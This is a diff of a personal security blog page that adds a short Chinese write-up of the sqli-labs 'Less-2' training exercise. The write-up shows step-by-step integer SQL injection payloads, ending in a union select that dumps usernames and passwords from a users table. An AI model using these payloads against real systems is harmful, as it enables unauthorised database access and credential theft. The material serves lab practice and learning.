@@ -37,15 +37,27 @@
     var CONFIG = {"hostname":"lucifer-rossweisse.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sec-Rossweisse">
-<meta property="og:url" content="https://lucifer-rossweisse.github.io/tags/python/index.html">
+  <meta name="description" content="Less-2由提示知道是整数型注入 老套路  id&#x3D;1 and 1&#x3D;1 –+   吧1&#x3D;1换成1&#x3D;2  id&#x3D;1 and 1&#x3D;2 –+   没有错误，也没有回显，说明为数字型注入 查询有多少列  id&#x3D;1 order by 4 –+   查询显示点  id&#x3D;-1 union select 1,2,3 –+   查询用户名，密码  id&#x3D;-1 union select 1,(select group">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-labs-Less-2">
+<meta property="og:url" content="https://lucifer-rossweisse.github.io/2021/02/05/sql/sql-labs/Less-2/index.html">
 <meta property="og:site_name" content="Sec-Rossweisse">
+<meta property="og:description" content="Less-2由提示知道是整数型注入 老套路  id&#x3D;1 and 1&#x3D;1 –+   吧1&#x3D;1换成1&#x3D;2  id&#x3D;1 and 1&#x3D;2 –+   没有错误，也没有回显，说明为数字型注入 查询有多少列  id&#x3D;1 order by 4 –+   查询显示点  id&#x3D;-1 union select 1,2,3 –+   查询用户名，密码  id&#x3D;-1 union select 1,(select group">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/05/WQwvVTFnXJ5uZLk.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/05/KArDL278xCdeFfz.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/05/XVn3rlqwRDE72mc.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/05/eLAR9GtmOQDx4Kg.png">
+<meta property="og:image" content="https://i.loli.net/2021/02/05/Ct1aSrnvK3cE8Yz.png">
+<meta property="article:published_time" content="2021-02-05T10:10:12.000Z">
+<meta property="article:modified_time" content="2021-02-05T10:17:34.244Z">
 <meta property="article:author" content="Sec-Rossweisse">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="sql-labs">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/05/WQwvVTFnXJ5uZLk.png">
 
-<link rel="canonical" href="https://lucifer-rossweisse.github.io/tags/python/">
+<link rel="canonical" href="https://lucifer-rossweisse.github.io/2021/02/05/sql/sql-labs/Less-2/">
 
 
 <script id="page-configurations">
@@ -53,12 +65,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>标签: python | Sec-Rossweisse</title>
+  <title>sql-labs-Less-2 | Sec-Rossweisse</title>
   
 
 
@@ -199,51 +211,150 @@
         <div class="content-wrap">
           
 
-          <div class="content tag">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">python
-          <small>标签</small>
-        </h2>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lucifer-rossweisse.github.io/2021/02/05/sql/sql-labs/Less-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/id.jpg">
+      <meta itemprop="name" content="Sec-Rossweisse">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Rossweisse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql-labs-Less-2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-05 18:10:12 / 修改时间：18:17:34" itemprop="dateCreated datePublished" datetime="2021-02-05T18:10:12+08:00">2021-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2021/02/05/sql/sql-labs/Less-2/" class="post-meta-item leancloud_visitors" data-flag-title="sql-labs-Less-2" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>213</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
+        <h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>由提示知道是整数型注入</p>
+<p>老套路</p>
+<blockquote>
+<p>id=1 and 1=1 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/WQwvVTFnXJ5uZLk.png"></p>
+<p>吧1=1换成1=2</p>
+<blockquote>
+<p>id=1 and 1=2 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/KArDL278xCdeFfz.png"></p>
+<p>没有错误，也没有回显，说明为数字型注入</p>
+<p>查询有多少列</p>
+<blockquote>
+<p>id=1 order by 4 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/XVn3rlqwRDE72mc.png"></p>
+<p>查询显示点</p>
+<blockquote>
+<p>id=-1 union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/eLAR9GtmOQDx4Kg.png"></p>
+<p>查询用户名，密码</p>
+<blockquote>
+<p>id=-1 union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/05/Ct1aSrnvK3cE8Yz.png"></p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-02-01T11:43:40+08:00"
-              content="2021-02-01">
-          02-01
-        </time>
-      </div>
+    
+    
+    
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/02/01/python%E5%88%97%E8%A1%A8%E7%9A%84%E8%BF%90%E7%94%A8/" itemprop="url">
-            <span itemprop="name">python列表的运用</span>
-          </a>
-      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+              <a href="/tags/sql-labs/" rel="tag"># sql-labs</a>
+          </div>
 
-    </header>
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/05/sql/sql-labs/Less-1/" rel="prev" title="sql-labs-Less-1">
+      <i class="fa fa-chevron-left"></i> sql-labs-Less-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/05/sql/sql-labs/Less-3/" rel="next" title="sql-labs-Less-3">
+      sql-labs-Less-3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
   </article>
-
-    </div>
-  </div>
   
   
-  
-
   
 
 
@@ -298,6 +409,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-2"><span class="nav-number">1.</span> <span class="nav-text">Less-2</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
